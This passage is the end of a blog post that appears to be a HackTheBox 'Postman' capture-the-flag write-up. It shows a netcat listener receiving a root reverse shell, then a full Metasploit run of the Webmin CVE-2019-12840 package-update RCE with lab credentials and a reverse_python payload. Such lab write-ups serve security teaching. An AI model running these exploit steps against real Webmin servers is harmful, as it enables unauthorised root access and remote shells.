<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Executing payload...
</code></pre></div><p>Aaaand a new connection open on our listener:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#f92672">[</span>hg8@archbook ~<span style="color:#f92672">]</span>$ nc -l -vv -p <span style="color:#ae81ff">8585</span>
Listening on any address <span style="color:#ae81ff">8585</span>
Connection from 10.10.10.160:54474

root@Postman:/usr/share/webmin/package-updates/# cd
root@Postman:~# cat root.txt
a2xxxxxxxxxxxxxxxxxxxxxce
</code></pre></div><h2 id="additional-information">Additional information</h2>
<p>For the CVE-2019-12840, Metasploit could have been used the following way:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#f92672">[</span>hg8@archbook ~<span style="color:#f92672">]</span>$ msfconsole
msf5 &gt; use exploit/linux/http/webmin_packageup_rce
msf5 exploit<span style="color:#f92672">(</span>linux/http/webmin_packageup_rce<span style="color:#f92672">)</span> &gt; show options

Module options <span style="color:#f92672">(</span>exploit/linux/http/webmin_packageup_rce<span style="color:#f92672">)</span>:

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   PASSWORD                    yes       Webmin Password
   Proxies                     no        A proxy chain of format type:host:port<span style="color:#f92672">[</span>,type:host:port<span style="color:#f92672">][</span>...<span style="color:#f92672">]</span>
   RHOSTS                      yes       The target host<span style="color:#f92672">(</span>s<span style="color:#f92672">)</span>, range CIDR identifier, or hosts file with syntax <span style="color:#e6db74">&#39;file:&lt;path&gt;&#39;</span>
   RPORT      <span style="color:#ae81ff">10000</span>            yes       The target port <span style="color:#f92672">(</span>TCP<span style="color:#f92672">)</span>
   SSL        false            no        Negotiate SSL/TLS <span style="color:#66d9ef">for</span> outgoing connections
   TARGETURI  /                yes       Base path <span style="color:#66d9ef">for</span> Webmin application
   USERNAME                    yes       Webmin Username
   VHOST                       no        HTTP server virtual host


Payload options <span style="color:#f92672">(</span>cmd/unix/reverse_perl<span style="color:#f92672">)</span>:

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST                   yes       The listen address <span style="color:#f92672">(</span>an interface may be specified<span style="color:#f92672">)</span>
   LPORT  <span style="color:#ae81ff">4444</span>             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   <span style="color:#ae81ff">0</span>   Webmin &lt;<span style="color:#f92672">=</span> 1.910


msf5 exploit<span style="color:#f92672">(</span>linux/http/webmin_packageup_rce<span style="color:#f92672">)</span> &gt; set RHOSTS 10.10.10.160
RHOSTS <span style="color:#f92672">=</span>&gt; 10.10.10.160
msf5 exploit<span style="color:#f92672">(</span>linux/http/webmin_packageup_rce<span style="color:#f92672">)</span> &gt; set LHOST 10.10.10.10
LHOST <span style="color:#f92672">=</span>&gt; 10.10.10.160
msf5 exploit<span style="color:#f92672">(</span>linux/http/webmin_packageup_rce<span style="color:#f92672">)</span> &gt; set username Matt
username <span style="color:#f92672">=</span>&gt; Matt
msf5 exploit<span style="color:#f92672">(</span>linux/http/webmin_packageup_rce<span style="color:#f92672">)</span> &gt; set password computer2008
password <span style="color:#f92672">=</span>&gt; computer2008
msf5 exploit<span style="color:#f92672">(</span>linux/http/webmin_packageup_rce<span style="color:#f92672">)</span> &gt; set payload cmd/unix/reverse_python
payload <span style="color:#f92672">=</span>&gt; cmd/unix/reverse_python

msf5 exploit<span style="color:#f92672">(</span>linux/http/webmin_packageup_rce<span style="color:#f92672">)</span> &gt; set SSL true
SSL <span style="color:#f92672">=</span>&gt; true
msf5 exploit<span style="color:#f92672">(</span>linux/http/webmin_packageup_rce<span style="color:#f92672">)</span> &gt; options

Module options <span style="color:#f92672">(</span>exploit/linux/http/webmin_packageup_rce<span style="color:#f92672">)</span>:

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   PASSWORD   computer2008     yes       Webmin Password
   Proxies                     no        A proxy chain of format type:host:port<span style="color:#f92672">[</span>,type:host:port<span style="color:#f92672">][</span>...<span style="color:#f92672">]</span>
   RHOSTS     10.10.10.160     yes       The target host<span style="color:#f92672">(</span>s<span style="color:#f92672">)</span>, range CIDR identifier, or hosts file with syntax <span style="color:#e6db74">&#39;file:&lt;path&gt;&#39;</span>
   RPORT      <span style="color:#ae81ff">10000</span>            yes       The target port <span style="color:#f92672">(</span>TCP<span style="color:#f92672">)</span>
   SSL        true             no        Negotiate SSL/TLS <span style="color:#66d9ef">for</span> outgoing connections
   TARGETURI  /                yes       Base path <span style="color:#66d9ef">for</span> Webmin application
   USERNAME   Matt             yes       Webmin Username
   VHOST                       no        HTTP server virtual host


Payload options <span style="color:#f92672">(</span>cmd/unix/reverse_python<span style="color:#f92672">)</span>:

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  10.10.15.123     yes       The listen address <span style="color:#f92672">(</span>an interface may be specified<span style="color:#f92672">)</span>
   LPORT  <span style="color:#ae81ff">8585</span>             yes       The listen port
   SHELL  /bin/bash        yes       The system shell to use.



 msf5 exploit<span style="color:#f92672">(</span>linux/http/webmin_packageup_rce<span style="color:#f92672">)</span> &gt; check

<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> NICE! Matt has the right to &gt;&gt;Package Update&lt;&lt;
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> 10.10.10.160:10000 - The target is vulnerable.
msf5 exploit<span style="color:#f92672">(</span>linux/http/webmin_packageup_rce<span style="color:#f92672">)</span> &gt; run

<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Started reverse TCP handler on 10.10.10.10:8585
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Session cookie: 0712c463a268f71262aa809eb4f41928
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Attempting to execute the payload...
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Command shell session <span style="color:#ae81ff">1</span> opened <span style="color:#f92672">(</span>10.10.10.10:8585 -&gt; 10.10.10.160:38146<span style="color:#f92672">)</span> at 2019-11-05 02:07:59 +0100

id
uid<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span>
cat /root/root.txt
a2xxxxxxxxxxxxxxxxxxxxxce
</code></pre></div><hr>
<p>That&rsquo;s it folks! As always do not hesitate to contact me for any questions or feedbacks!</p>
<p>See you next time ;)</p>
<p>-hg8</p>

    </div>
    
      
        <div class="pagination">
          <div class="pagination__title">
            <span class="pagination__title-h">Read other posts</span>
            <hr />
          </div>
          <div class="pagination__buttons">
            
              <span class="button previous">
                <a href="/posts/arch-linux-huawei-matebook-x-pro-2019/">
                  <span class="button__icon">←</span>
                  <span class="button__text">Arch Linux install on Huawei MateBook Pro X 2019</span>
                </a>
              </span>
            
            
              <span class="button next">
                <a href="/posts/bitlab/">
                  <span class="button__text">Bitlab - HackTheBox</span>
                  <span class="button__icon">→</span>
                </a>
              </span>
            
          </div>
        </div>
      
    


    
      
        <br><br>
<script src="https://utteranc.es/client.js"
        repo="hg8/hg8.github.io"
        issue-term="pathname"
        label="💬 Comment"
        theme="photon-dark"
        crossorigin="anonymous"
        async>
</script>

      
    

    </div>

      </div>

      
        <footer class="footer">
  <div class="footer__inner">
    
      <div class="footer__content">
        <span>© 2020</span>
        <span><a href="https://hg8.sh" target="_blank" rel="noopener">hg8.sh</a></span>
        <span>
          &nbsp; 
          <a class="social-icon" href="https://twitter.com/_hg8_" target="_blank" rel="noopener" title="Twitter"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1" stroke-linecap="round" stroke-linejoin="round"><path d="M23 3a10.9 10.9 0 0 1-3.14 1.53 4.48 4.48 0 0 0-7.86 3v1A10.66 10.66 0 0 1 3 4s-4 9 5 13a11.64 11.64 0 0 1-7 2c9 5 20 0 20-11.5a4.5 4.5 0 0 0-.08-.83A7.72 7.72 0 0 0 23 3z"></path></svg></a>
          &nbsp; 
          <a class="social-icon" href="https://github.com/hg8" target="_blank" rel="noopener" title="Github"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1" stroke-linecap="round" stroke-linejoin="round"><path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22"></path></svg></a>
          &nbsp;
          <a class="social-icon" href="https://www.hackthebox.eu/profile/128102" target="_blank" rel="noopener" title="hackthebox"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1" stroke-linecap="round" stroke-linejoin="round"><path d="M21 16V8a2 2 0 0 0-1-1.73l-7-4a2 2 0 0 0-2 0l-7 4A2 2 0 0 0 3 8v8a2 2 0 0 0 1 1.73l7 4a2 2 0 0 0 2 0l7-4A2 2 0 0 0 21 16z"></path><polyline points="3.27 6.96 12 12.01 20.73 6.96"></polyline><line x1="12" y1="22.08" x2="12" y2="12"></line></svg></a>
          &nbsp; 
          <a class="social-icon" href="https://hg8.sh/index.xml" target="_blank" rel="noopener" title="RSS"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1" stroke-linecap="round" stroke-linejoin="round"><path d="M4 11a9 9 0 0 1 9 9"></path><path d="M4 4a16 16 0 0 1 16 16"></path><circle cx="5" cy="19" r="1"></circle></svg></a>
        </span>
      </div>
    
  </div>
</footer>



<script src="/assets/main.js"></script>
<script src="/assets/prism.js"></script>

      
    </div>

    
  </body>
</html>
